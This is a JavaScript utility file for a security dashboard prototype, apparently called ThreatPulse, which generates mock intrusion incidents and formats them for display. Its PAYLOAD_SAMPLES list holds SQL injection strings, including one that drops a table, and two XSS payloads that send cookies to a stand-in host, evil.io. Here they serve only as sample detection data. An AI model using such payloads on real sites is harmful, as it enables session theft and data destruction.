/* ==========================================================================
   ThreatPulse — shared client utilities
   --------------------------------------------------------------------------
   This file stands in for the REST layer that will talk to the Java
   Servlet API (which in turn calls the Python Flask AI service). Every
   function that should become a real fetch() call is marked with
   TODO(API): <method> <path> — swap the mock body for the fetch and the
   pages do not need to change.
   ========================================================================== */

const API_BASE = '/api'; // Java servlet REST base path

const THREAT_TYPES = {
  brute_force: { label: 'Brute-force login', method: 'Rule-based' },
  dos_flood:   { label: 'Request flooding (DoS/bot)', method: 'Rule-based' },
  payload:     { label: 'Suspicious payload (SQLi/XSS)', method: 'Rule-based' },
  anomaly:     { label: 'Behavioral anomaly', method: 'Isolation Forest' },
};

const SEVERITY_ORDER = ['critical', 'high', 'medium', 'low'];

const SEVERITY_META = {
  critical: { label: 'Critical', class: 'badge-critical' },
  high:     { label: 'High',     class: 'badge-high' },
  medium:   { label: 'Medium',   class: 'badge-medium' },
  low:      { label: 'Low',      class: 'badge-low' },
};

const RECOMMENDED_ACTIONS = {
  brute_force: [
    'Lock the targeted account after policy-defined failed attempts',
    'Temporarily block the source IP at the edge/firewall',
    'Force a password reset and notify the account owner',
  ],
  dos_flood: [
    'Enable rate limiting / WAF challenge for the source range',
    'Add the source IP(s) to the temporary block list',
    'Scale or shed load on the affected endpoint if traffic persists',
  ],
  payload: [
    'Block the request at the WAF using the matched signature',
    'Review application logs for signs of successful exploitation',
    'Patch or sanitize the affected input field',
  ],
  anomaly: [
    'Verify the login/session with the account owner out-of-band',
    'Review recent activity from this session for unusual actions',
    'Flag the IP/geo combination for a watchlist if unconfirmed',
  ],
};

/* ---------------------------------------------------------------------- */
/* Mock incident generation                                                */
/* ---------------------------------------------------------------------- */

function seededRandom(seed) {
  let s = seed;
  return function () {
    s = (s * 9301 + 49297) % 233280;
    return s / 233280;
  };
}

function randomIp(rnd) {
  return `${Math.floor(rnd() * 223) + 1}.${Math.floor(rnd() * 255)}.${Math.floor(rnd() * 255)}.${Math.floor(rnd() * 255)}`;
}

const GEOS = ['US-East', 'US-West', 'DE-Frankfurt', 'SG-Singapore', 'BR-SaoPaulo', 'RU-Moscow', 'NG-Lagos', 'IN-Mumbai', 'NL-Amsterdam', 'VN-Hanoi'];
const USERS = ['j.alvarez', 'r.chen', 'k.osei', 'm.nowak', 'a.patel', 's.kowalski', 'svc-billing', 'admin', 'd.fontaine', 't.nguyen'];
const ENDPOINTS = ['/login', '/api/v1/accounts', '/checkout', '/api/v1/search', '/admin/console', '/api/v1/export', '/reset-password'];
const PAYLOAD_SAMPLES = [
  "' OR '1'='1' --",
  "<script>document.location='//evil.io/'+document.cookie</script>",
  "'; DROP TABLE sessions; --",
  "<img src=x onerror=fetch('//evil.io/c?'+document.cookie)>",
  "admin'--",
];

function buildIncident(rnd, id) {
  const types = Object.keys(THREAT_TYPES);
  const type = types[Math.floor(rnd() * types.length)];
  let severity, detail, ip = randomIp(rnd), geo = GEOS[Math.floor(rnd() * GEOS.length)];
  const user = USERS[Math.floor(rnd() * USERS.length)];
  const endpoint = ENDPOINTS[Math.floor(rnd() * ENDPOINTS.length)];
  const score = +(rnd()).toFixed(2);

  if (type === 'brute_force') {
    const attempts = Math.floor(rnd() * 40) + 8;
    severity = attempts > 25 ? 'critical' : 'high';
    detail = `${attempts} failed login attempts in 3 min window`;
  } else if (type === 'dos_flood') {
    const rps = Math.floor(rnd() * 900) + 120;
    severity = rps > 500 ? 'high' : 'medium';
    detail = `${rps} req/s sustained for 90s, threshold 150 req/s`;
  } else if (type === 'payload') {
    severity = 'critical';
    detail = PAYLOAD_SAMPLES[Math.floor(rnd() * PAYLOAD_SAMPLES.length)];
  } else {
    severity = score > 0.8 ? 'medium' : 'low';
    detail = `Anomaly score ${score} — new IP/geo (${geo}) at unusual hour for ${user}`;
  }

  const daysAgo = rnd() * 14;
  const ts = new Date(Date.now() - daysAgo * 86400000 - rnd() * 3600000);
  const statusRoll = rnd();
  const status = statusRoll > 0.72 ? 'resolved' : statusRoll > 0.45 ? 'acknowledged' : 'open';

  return {
    id: `INC-${String(1000 + id)}`,
    type, severity, status,
    ip, geo, user, endpoint,
    detail,
    score,
    timestamp: ts.toISOString(),
    aiExplanation: buildExplanation(type, detail, user, ip),
  };
}

function buildExplanation(type, detail, user, ip) {
  switch (type) {
    case 'brute_force':
      return `The rule engine flagged repeated authentication failures from ${ip} against the same account within a short window, exceeding the configured threshold. This pattern is consistent with password guessing or credential stuffing rather than normal user error.`;
    case 'dos_flood':
      return `Request volume from ${ip} exceeded the per-source rate threshold across a sustained interval, with a request shape (timing, user agent, endpoint reuse) consistent with automated tooling rather than organic browsing.`;
    case 'payload':
      return `The signature engine matched known SQL injection / cross-site scripting patterns in the request payload. This is a direct exploitation attempt against the application layer, independent of request volume or login behavior.`;
    case 'anomaly':
      return `The Isolation Forest model scored this session as an outlier relative to ${user}'s historical baseline (login hour, source geography, and session volume). Isolation Forest isolates anomalies by measuring how few random partitions are needed to separate a point — outliers isolate faster, yielding a higher anomaly score. No signature or threshold rule fired; this is a behavioral deviation only.`;
  }
}

function generateIncidents(count = 42, seed = 7) {
  const rnd = seededRandom(seed);
  const list = [];
  for (let i = 0; i < count; i++) list.push(buildIncident(rnd, i));
  return list.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
}

// TODO(API): GET /api/incidents?range=&severity=&type=&status=
// Replace this cached mock with a fetch to the Java servlet, which proxies
// to MySQL. Keep the same shape (array of incident objects above) so the
// rendering code below does not change.
const INCIDENTS_STORAGE_KEY = 'vantage_incidents';

function getIncidents() {
  if (!window.__VANTAGE_INCIDENTS__) {
    const cached = sessionStorage.getItem(INCIDENTS_STORAGE_KEY);
    if (cached) {
      try {
        window.__VANTAGE_INCIDENTS__ = JSON.parse(cached);
      } catch (e) {
        window.__VANTAGE_INCIDENTS__ = generateIncidents();
      }
    } else {
      window.__VANTAGE_INCIDENTS__ = generateIncidents();
    }
  }
  return window.__VANTAGE_INCIDENTS__;
}

// Call this after any create/update/delete so the change survives
// navigating to another page. Once the real API is wired in, this
// (and INCIDENTS_STORAGE_KEY) can be removed entirely.
function saveIncidents() {
  sessionStorage.setItem(INCIDENTS_STORAGE_KEY, JSON.stringify(getIncidents()));
}

/* ---------------------------------------------------------------------- */
/* Formatting helpers                                                      */
/* ---------------------------------------------------------------------- */

function fmtTime(iso) {
  const d = new Date(iso);
  return d.toLocaleString(undefined, { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
}

function relTime(iso) {
  const diffMs = Date.now() - new Date(iso).getTime();
  const mins = Math.floor(diffMs / 60000);
  if (mins < 1) return 'just now';
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ago`;
  return `${Math.floor(hrs / 24)}d ago`;
}

function severityBadge(sev) {
  const m = SEVERITY_META[sev];
  return `<span class="badge ${m.class}">${m.label}</span>`;
}

function statusBadge(status) {
  if (status === 'resolved') return '<span class="badge badge-safe">Resolved</span>';
  if (status === 'acknowledged') return '<span class="badge badge-low">Acknowledged</span>';
  return '<span class="badge badge-neutral">Open</span>';
}

function typeLabel(type) {
  return THREAT_TYPES[type]?.label || type;
}

function qs(sel, root = document) { return root.querySelector(sel); }
function qsa(sel, root = document) { return Array.from(root.querySelectorAll(sel)); }

function setActiveNav() {
  const path = location.pathname.split('/').pop() || 'dashboard.html';
  qsa('.nav a').forEach(a => {
    if (a.getAttribute('href') === path) a.classList.add('active');
  });
}

document.addEventListener('DOMContentLoaded', setActiveNav);


